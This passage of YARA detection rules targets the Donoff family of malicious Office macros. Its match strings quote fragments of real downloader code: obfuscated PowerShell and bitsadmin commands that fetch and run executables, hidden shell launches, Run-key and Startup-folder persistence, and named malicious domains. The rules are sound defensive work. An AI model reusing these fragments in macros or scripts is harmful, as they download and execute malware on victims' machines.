        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 20 43 42 6f 6f 6c 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 29 20 2d 20 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2f 20 4f 63 74 28 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2f 20 48 65 78 28}  //weight: 1, accuracy: Low
        $x_1_2 = {48 65 78 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2a 20 43 68 72 57 28 ?? ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2b 20 49 6e 74 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2a 20 52 6e 64 28}  //weight: 1, accuracy: Low
        $x_1_3 = {54 61 6e 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2a 20 49 6e 74 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2a 20 53 71 72 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2f 20 ?? ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2b 20 46 69 78 28}  //weight: 1, accuracy: Low
        $x_1_4 = {43 44 62 6c 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 29 20 2d 20 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2f 20 43 53 6e 67 28 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2d 20 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2f 20 48 65 78 28}  //weight: 1, accuracy: Low
        $x_1_5 = {43 68 72 42 28 ?? ?? ?? (30|2d|39) (30|2d|39) 20 2b 20 53 69 6e 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2a 20 43 4c 6e 67 28 ?? ?? ?? (61|2d|7a|41|2d|5a) (61|2d|7a|41|2d|5a) 20 2b 20 ?? ?? ?? (30|2d|39) (30|2d|39) 29 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FM_2147732265_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FM"
        threat_id = "2147732265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2b 20 43 68 72 28 [0-96] 20 2b 20 38 30 20 2b 20 [0-96] 29 20 2b 20 22 6f 77 22 20 2b 20 22 65 72 73 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FS_2147732266_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FS"
        threat_id = "2147732266"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {43 68 72 28 [0-6] 20 2b 20 [0-6] 20 2b 20 [0-6] 20 2b 20 [0-6] 20 2b 20 [0-6] 29}  //weight: 10, accuracy: Low
        $x_1_2 = {53 65 63 6f 6e 64 20 22 [0-30] 22 20 2b 20 22 [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {48 6f 75 72 20 22 [0-30] 22 20 2b 20 22 [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {4d 6f 6e 74 68 20 22 [0-30] 22 20 2b 20 22 [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_5 = {4d 6f 6e 74 68 20 43 53 74 72 28 22 [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_6 = {56 61 72 54 79 70 65 20 22 [0-30] 22 20 2b 20 22 [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_7 = {4f 6e 20 5f 0d 0a 45 72 72 6f 72 20 5f 0d 0a 52 65 73 75 6d 65 20 5f 0d 0a 4e 65 78 74 0d 0a 53 65 74}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_WA_2147732267_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.WA"
        threat_id = "2147732267"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 02 00 [0-3] 20 3d 20 22 [0-2] 22 02 00 02 20 01 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {28 42 79 52 65 66 20 ?? ?? ?? ?? [0-4] 2c 20 42 79 52 65 66 20 ?? ?? ?? ?? [0-4] 2c 20 ?? ?? ?? ?? [0-4] 29 02 00 ?? ?? ?? ?? [0-6] 20 3d 20 4c 65 6e 28 04 05 29 02 00 49 66 20 00 01 20 3c 3d 20 07 08 20 54 68 65 6e 02 00 02 03 20 3d 20 02 03 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = {28 52 69 67 68 74 28 4c 65 66 74 28 ?? ?? ?? ?? [0-4] 2c 20 ?? ?? ?? ?? [0-4] 29 2c 20 31 29 29 2c 20 01 00 02 00 29 02 00}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 ?? ?? ?? ?? [0-8] 2c 20 30 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EY_2147732268_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EY"
        threat_id = "2147732268"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"powers\"" ascii //weight: 1
        $x_1_2 = "= po6H + \"hell.exe -nop -w hidden -e" ascii //weight: 1
        $x_1_3 = "Call Shell(po6H, vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EY_2147732268_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EY"
        threat_id = "2147732268"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {47 76 63 4d 69 6a 73 20 3d 20 53 62 74 68 77 56 49 44 69 6e 46 20 2b 20 49 54 63 6b 6e 4e 4e 76 58 59 0d 0a 56 42 41 2e 53 68 65 6c 6c 24 20 47 76 63 4d 69 6a 73 2c 20 30 0d 0a 45 6e 64 20 53 75 62 0d 0a 53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a 77 4c 62 46 43 43 50 49 69}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EY_2147732268_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EY"
        threat_id = "2147732268"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"powe\" + \"rshell -nop -Ex\" + \"ec Bypass -Comm\" + \"and (New-Obje\" + \"ct Syst\" + \"em.Net.WebC\" + \"lient).Downl\" + \"oadFile('http://" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EY_2147732268_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EY"
        threat_id = "2147732268"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set oShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "oShell.Run " ascii //weight: 1
        $x_1_3 = "= \"powe\" + \"rshell -Windo\" + \"wStyle Hid\" + \"den" ascii //weight: 1
        $x_1_4 = {2e 6e 65 78 74 28 31 2c 20 36 35 35 33 36 29 3b [0-16] 20 3d 20 24 65 6e 76 3a 74 65 6d 70 20 2b 20 27 27 20 2b 20 [0-16] 20 2b 20 27 2e 65 78 65 27 3b 66 6f 72 65 61 63 68 28}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 22 63 6d 64 20 2f 63 20 62 69 74 73 61 22 20 2b 20 22 64 6d 69 6e 20 2f 74 72 61 6e 73 66 65 72 20 [0-16] 20 2f 70 72 69 6f 72 22 20 2b 20 22 69 74 79 20 68 69 67 68 20 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_6 = {25 74 65 6d 22 20 2b 20 22 70 25 5c [0-16] 2e 65 78 65 20 26 20 73 74 61 72 74 20 2f 57 41 49 54 20 25 74 65 22 20 2b 20 22 6d 70 25 5c [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EZ_2147732269_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EZ"
        threat_id = "2147732269"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \"c\" + \"md /V\" + \" /C \" + Chr(34) +" ascii //weight: 1
        $x_1_2 = "= Mid(" ascii //weight: 1
        $x_1_3 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EZ_2147732269_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EZ"
        threat_id = "2147732269"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Users\\\" & Environ(\"UserName\") & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" &" ascii //weight: 1
        $x_1_2 = "=new ActiveXObject(\" & Chr(34) & \"WScript.Shell\" & Chr(34) & \")" ascii //weight: 1
        $x_1_3 = ".run('%windir%\\\\System32\\\\cmd.exe /c powershell.exe -nop -w hidden -e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EZ_2147732269_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EZ"
        threat_id = "2147732269"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 70 6f 77 65 22 20 2b 20 22 72 73 68 65 6c 6c 20 24 [0-16] 20 3d 20 6e 65 22 20 2b 20 22 77 2d 6f 62 22 20 2b 20 22 6a 65 63 74 20 53 79 73 22 20 2b 20 22 74 65 6d 2e 4e 65 22 20 2b 20 22 74 2e 57 65 62 22 20 2b 20 22 43 6c 69 65 6e 74 3b 24 [0-16] 20 3d 20 6e 65 77 2d 6f 62 22 20 2b 20 22 6a 65 63 74 20 72 61 22 20 2b 20 22 6e 64 6f 6d 3b 20 20 22}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e 20 [0-32] 20 2b 20 [0-32] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 70 6f 22 20 2b 20 22 77 65 72 73 68 65 22 20 2b 20 22 6c 6c 20 24 [0-16] 20 3d 20 6e 65 77 2d 6f 62 22 20 2b 20 22 6a 65 63 74 20 53 79 73 22 20 2b 20 22 74 65 6d 2e 4e 65 22 20 2b 20 22 74 2e 57 65 62 22 20 2b 20 22 43 6c 69 22 20 2b 20 22 65 6e 74 3b 24 [0-16] 20 3d 20 6e 65 77 2d 6f 62 22 20 2b 20 22 6a 65 63 74 20 72 61 22 20 2b 20 22 6e 64 6f 6d 3b 20 20 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FA_2147732270_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FA"
        threat_id = "2147732270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd.exe /c b^i^t^s^a^d^min^ /t^ra^n^s^f^e^r^ ^/^d^o^w^n^l^o^a^d" ascii //weight: 1
        $x_1_2 = "%tmp%/DSajIODA.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FA_2147732270_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FA"
        threat_id = "2147732270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set Fileout = FSO.CreateTextFile(Environ(\"Appdata\") & \"\\gtls.vbs\", True, True)" ascii //weight: 1
        $x_1_2 = "Fileout.Write UserForm1.txtVBS.Text" ascii //weight: 1
        $x_1_3 = {53 65 74 41 74 74 72 20 [0-16] 2c 20 76 62 48 69 64 64 65 6e}  //weight: 1, accuracy: Low
        $x_1_4 = "wshShell.Run fp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FA_2147732270_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FA"
        threat_id = "2147732270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pFolder = WshShell.ExpandEnvironmentStrings('%localappdata%')+'\\\\Python';" ascii //weight: 1
        $x_1_2 = "get_page_content_with_ie(server + '/getid', 'action=up&uid='+id+'&antivirus='+return_av_name());" ascii //weight: 1
        $x_1_3 = "youwillnotfindthisanywhare" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FB_2147732271_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FB"
        threat_id = "2147732271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "303"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Lib \"Shlwapi.dll  \" Alias \"GetOverlappedResult\" (ByVal" ascii //weight: 1
        $x_1_2 = "Lib \"Ntdll.dll   \" Alias \"NtWriteVirtualMemory\" (ByVal" ascii //weight: 1
        $x_1_3 = "Lib \"Shlwapi.dll  \" Alias \"SleepConditionVariableSRW\" (ByVal" ascii //weight: 1
        $x_1_4 = "Lib \"ntdll.dll  \" Alias \"AcquireSRWLockShared\" (" ascii //weight: 1
        $x_1_5 = {4c 69 62 20 22 4e 74 64 6c 6c 2e 64 6c 6c 20 22 20 41 6c 69 61 73 20 5f [0-4] 22 4e 74 41 6c 6c 6f 63 61 74 65 56 69 72 74 75 61 6c 4d 65 6d 6f 72 79 22 20 28}  //weight: 1, accuracy: Low
        $x_100_6 = " = VBA.StrConv(" ascii //weight: 100
        $x_100_7 = "Private Sub Document_Open()" ascii //weight: 100
        $x_100_8 = {61 63 74 69 76 61 74 69 6f 6e 2e [0-9] 2e 56 61 6c 75 65 20 3d 20 44 61 79 28 23 31 32 2f 35 2f 32 30 31 33 23 29}  //weight: 100, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_100_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_FB_2147732271_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FB"
        threat_id = "2147732271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 61 74 68 20 3d 20 45 6e 76 69 72 6f 6e 28 22 08 00 22 29 20 2b 20 22 5c 22 20 2b 20 22 08 00 22 20 2b 20 22 2e 64 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {50 61 74 68 05 00 52 75 6e 20 3d 20 45 6e 76 69 72 6f 6e 28 22 41 4c 4c 55 53 45 52 53 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c 22 20 2b 20 22 10 00 22 20 2b 20 22 2e 64 6c 6c 22}  //weight: 1, accuracy: Low
        $x_1_3 = "objProcess.Create \"run\" + \"dll\" + \"32\" + \".exe \" + Chr(34) + Path + Chr(34) + \", \" + \"#1\", Null, objConfig, intProcessID" ascii //weight: 1
        $x_1_4 = {63 6d 64 4c 69 6e 65 41 52 75 6e 20 3d 20 22 43 3a 5c 57 24 69 6e 22 20 2b 20 22 64 6f 24 77 73 5c 53 79 24 73 74 22 20 2b 20 22 65 6d 24 33 32 5c 22 20 2b 20 22 72 75 6e 22 20 2b 20 22 24 24 24 24 22 20 2b 20 22 64 24 6c 6c 22 20 2b 20 22 33 32 22 20 2b 20 22 24 22 20 2b 20 22 2e 65 24 78 65 20 22 20 2b 20 43 68 72 28 33 34 29 20 2b 20 50 61 74 68 05 00 52 75 6e 20 2b 20 22 24 24 22 20 2b 20 43 68 72 28 33 34 29 20 2b 20 22 2c 20 22 20 2b 20 22 23 31 22}  //weight: 1, accuracy: Low
        $x_1_5 = {57 53 68 65 6c 6c 2e 52 65 67 57 72 69 74 65 20 22 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 5c 10 00 22 2c 20 52 65 70 6c 61 63 65 28 63 6d 64 4c 69 6e 65 41 52 75 6e 2c 20 22 24 22 2c 20 22 22 29 2c 20 22 52 45 47 5f 53 5a 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FC_2147732272_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FC"
        threat_id = "2147732272"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell Environ(StrConv(DecodeBase64(\"VGVtcA==\"), vbUnicode)) &" ascii //weight: 1
        $x_1_2 = "Shell Environ(\"T\" & \"e\" & \"m\" & \"p\") & \"\\1s.bat\", vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FC_2147732272_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FC"
        threat_id = "2147732272"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {24 65 6e 76 3a 74 65 6d 70 20 2b 20 27 27 20 2b 20 24 [0-16] 2b 20 27 2e 65 78 65 27}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 44 6f 77 6e 6c [0-8] 6f 61 64 46 69 6c 65 28 24}  //weight: 1, accuracy: Low
        $x_1_3 = "Sta\" + \"rt-Pro\" + \"cess" ascii //weight: 1
        $x_1_4 = "catch{write-host" ascii //weight: 1
        $x_1_5 = "(\"WScript.Shell\").Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FD_2147732273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FD"
        threat_id = "2147732273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell .DecodedText, si - 2400 - 16" ascii //weight: 1
        $x_1_2 = "Then Shell Pow_SSS," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FD_2147732273_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FD"
        threat_id = "2147732273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "path = Environ(\"temp\") &" ascii //weight: 1
        $x_1_2 = {68 74 74 70 73 3a 2f 2f 6d 73 6f 66 66 69 63 65 2e 68 6f 73 74 2f ?? ?? ?? 68 6f 73 74 2e 65 78 65 22 2c 20 70 61 74 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FD_2147732273_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FD"
        threat_id = "2147732273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " + ActiveDocument.BuiltInDocumentProperties(\"Comments\") +" ascii //weight: 1
        $x_1_2 = "VBA.Shell$ \"\" + " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FD_2147732273_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FD"
        threat_id = "2147732273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "+ ActiveDocument.CustomDocumentProperties(" ascii //weight: 1
        $x_1_3 = " + ActiveDocument.BuiltInDocumentProperties(\"Comments\") +" ascii //weight: 1
        $x_1_4 = "VBA.Shell$ \"\" + " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_FE_2147732274_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.FE"
        threat_id = "2147732274"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set dim86 = dim04(dim30, dim53(dim40(dim8(), dim16(), 3), 3), 1, 0" ascii //weight: 1
        $x_1_2 = "dim66(dim3) = dim59(dim66(dim3), (dim16(dim98((dim16(dim51) + dim16(dim87)), (4780 - 4524)))))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EML_2147732954_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EML"
        threat_id = "2147732954"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "Private Declare Function URLDownloadToFileW Lib \"urlmon.dll\"" ascii //weight: 3
        $x_3_2 = "Private Declare Function ShellExecuteW Lib \"shell32.dll\"" ascii //weight: 3
        $x_2_3 = "Application.DisplayAlerts = False" ascii //weight: 2
        $x_1_4 = {3d 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 [0-255] 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PS_2147733076_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PS"
        threat_id = "2147733076"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 [0-7] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {47 6f 54 6f 20 [0-26] 20 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub Workbook_Open()" ascii //weight: 1
        $x_1_4 = "ThisWorkbook.Sheets(\"calcsheet\").Range(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PV_2147733353_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PV"
        threat_id = "2147733353"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"DownloadFile\" & _" ascii //weight: 1
        $x_1_2 = "oluyamachine.xyz" ascii //weight: 1
        $x_1_3 = "','%temp%" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

